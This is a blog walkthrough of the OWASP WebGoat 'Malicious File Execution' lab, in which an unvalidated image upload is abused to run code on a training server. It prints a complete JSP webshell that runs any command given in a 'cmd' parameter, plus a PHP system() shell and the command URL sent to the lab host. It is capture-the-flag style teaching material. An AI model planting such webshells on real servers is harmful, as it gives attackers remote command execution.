---
layout: post
title:  "OWASP BWA WebGoat Challenge: Malicious Execution"
subtitle: "Malicious File Execution"
date:   2017-01-31 08:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
# Malicious File Execution
Instructions:

- The form below allows you to upload an image which will be displayed on this page. Features like this are often found on web based discussion boards and social networking sites. This feature is vulnerable to Malicious File Execution.
- In order to pass this lesson, upload and run a malicious file. In order to prove that your file can execute, it should create another file named ```/var/lib/tomcat6/webapps/WebGoat/mfe_target/user.txt```
- Once you have created this file, you will pass the lesson.

The challenge greets us with an upload page for us to upload an image with. Let's upload a test image and see what happens:

<img src="{{ site.baseurl }}/images/webgoat/2017-01-31-webgoat_part_17/test-upload.jpg">

Alright. It displays it back to us. How about when we send a file that isn't an image? Like this text file:

```
$cat test.txt
text
```

<img src="{{ site.baseurl }}/images/webgoat/2017-01-31-webgoat_part_17/test-text-upload.jpg">

It looks like there is no input validation server side to make sure that we actually uploaded an image. This means that we can likely throw some malicious code up in a file that will be executed by the server. I tried a couple of naive methods that didn't work like a shell script:

```
$cat shell.sh
#!/bin/bash

mkdir -p /var/lib/tomcat6/webapps/WebGoat/mfe_target
echo 'executed' > touch /var/lib/tomcat6/webapps/WebGoat/mfe_target/user.txt
```

And a php shell:

{% highlight php %}
<?php
system("mkdir -p /var/lib/tomcat6/webapps/WebGoat/mfe_target;touch /var/lib/tomcat6/webapps/WebGoat/mfe_target/user.txt;echo 'executed' > /var/lib/tomcat6/webapps/WebGoat/mfe_target/user.txt")
?>
{% endhighlight %}

All of these were stored at the following location:

```
<p>Your current image:<img src="uploads/php_shell.php" vspace="0" hspace="0" border="0"></p>
```

But every time I traveled to them in a web browser, it just tried to download the file. Finally, I tried a ```.jsp``` file (Java Server Pages). Seeing as everything so far on the server was running Java, it made sense that Java might execute on upload. So I grabbed this shell payload from [NetSpi][jsp-shells]:

```
<%@ page import="java.util.*,java.io.*"%>
 <% 
 if (request.getParameter("cmd") != null) { 
 	out.println("Command: " + request.getParameter("cmd") + "<br />"); 
 	Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); 
 	OutputStream os = p.getOutputStream(); 
 	InputStream in = p.getInputStream(); 
 	DataInputStream dis = new DataInputStream(in); 
 	String disr = dis.readLine(); 
 	
 	while ( disr != null ) { 
 		out.println(disr); 
 		disr = dis.readLine();
 	}
 } 
 %>
```

Now when I navigated to the ```uploaded/cmd.jsp``` page, I wasn't displayed a download prompt!

<img src="{{ site.baseurl }}/images/webgoat/2017-01-31-webgoat_part_17/successful-jsp-upload.jpg">

Nice so we have a webshell embedded in the server. Let's see what happens when we specify shell commands via the ```cmd``` GET request parameter:

<img src="{{ site.baseurl }}/images/webgoat/2017-01-31-webgoat_part_17/jsp-command-exec.jpg">

Alright! Now let's append our shell commands to accomplish our goal of inserting a file ```user.txt``` in the directory ```/var/lib/tomcat6/webapps/WebGoat/mfe_target/``` to the controllable ```cmd``` request parameter:

```
http://192.168.56.101/WebGoat/uploads/cmd.jsp?cmd=mkdir%20-p%20/var/lib/tomcat6/webapps/WebGoat/mfe_target;touch%20/var/lib/tomcat6/webapps/WebGoat/mfe_target/user.txt;echo%20%27executed%27%20%3E%20/var/lib/tomcat6/webapps/WebGoat/mfe_target/user.txt
```

And when we send the request:

<img src="{{ site.baseurl }}/images/webgoat/2017-01-31-webgoat_part_17/jsp-file-insert.jpg">

<img src="{{ site.baseurl }}/images/webgoat/2017-01-31-webgoat_part_17/malicious-file-exec-completed.jpg">

We hacked the server with our malicious JSP webshell!

### References

[1. Hacking with JSP Shells][jsp-shells]

[2. Unrestricted File Upload][owasp-ufu]

[jsp-shells]:https://blog.netspi.com/hacking-with-jsp-shells/
[owasp-ufu]:https://www.owasp.org/index.php/Unrestricted_File_Upload